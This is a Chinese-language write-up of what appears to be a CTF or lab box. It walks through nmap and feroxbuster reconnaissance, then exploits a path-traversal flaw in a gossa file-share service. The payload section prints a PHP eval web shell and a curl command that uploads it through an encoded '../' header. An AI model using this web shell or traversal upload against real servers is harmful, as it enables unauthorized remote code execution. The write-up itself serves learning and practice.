---
date: 2026-09-22 10:00
title: Cuan-wp
author: 冰冰洁
---
# 信息收集

![[Pasted image 20260924111409.png]]

得到靶机ip为`10.203.140.214`

## nmap一下

```bash
nmap 10.203.140.214
```

![[Pasted image 20260924111602.png]]

得到以上结果，8001端口开放`vcom-tunnel`服务

分别访问对应端口：

- 80端口是一个名为前线大作战的小游戏
- 8001端口看着像一个文件系统，有一个readme文件

![[Pasted image 20260924112314.png]]
点开readme发现以下提示：

![[Pasted image 20260924112423.png]]

```
welcome to the gossa file share
```

## 对靶机进行目录/文件枚举

```bash
feroxbuster -u http://10.203.140.214 \
-w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt \
-x php,txt,html
```

- `-x`: 指定要额外尝试的**文件扩展名**。

得到以下结果：

![[Pasted image 20260924130420.png]]

- `config.php`
- `info.php`
- `login.php`

分别访问得到以下信息：

![[Pasted image 20260924130645.png]]

![[Pasted image 20260924130250.png]]

`config`文件没有什么信息，这个后台管理登录也没有详细的使用说明

回到8001端口查看网页源代码。注意到其开放了以下功能

![[Pasted image 20260924130925.png]]

- 提供Post和RPC接口，可以上传文件
- 支持的功能有`mkdirp`、`rm`、`mv`

有文件上传，就说明后端可能将用户输入与前面的路径拼接，因此可能存在目录穿越的漏洞。

但是我们还不知道现在的目录结构如何。因此回到`info.php`界面

得到路径结构

```
/var/www/gossahtml
```

![[Pasted image 20260924132336.png]]

## 漏洞利用

拉取gossa源码分析，发现漏洞：

**![[Pasted image 20260924161422.png]]

只进行了字符串前缀检查，因此我们需要利用漏洞只需要不使用`/`前缀即可

# payload

```bash
echo '<?php @eval($_POST["ant"]); ?>' > shell.php

curl -v -X POST 'http://10.203.140.214:8001/post' \
  -H 'gossa-path: ..%2Fgossahtml%2Fshell.php' \
  -F 'f=@shell.php'
```

- `-H 'gossa-path: ..%2Fgossahtml%2Fshell.php'`：自定义 HTTP 请求头
   -    `%2F` 是 URL 编码的`/`，解码后路径是 `../gossahtml/shell.php`
   -   作用：**指定文件上传后在服务器上保存的路径和文件名**，利用路径穿越（`../`）写到网站可访问目录
- `-F 'f=@shell.php'`：`-F`代表表单文件上传，`@`代表读取本地文件`shell.php`作为上传的文件内容

![[Pasted image 20260924163654.png]]

成功拿到shell

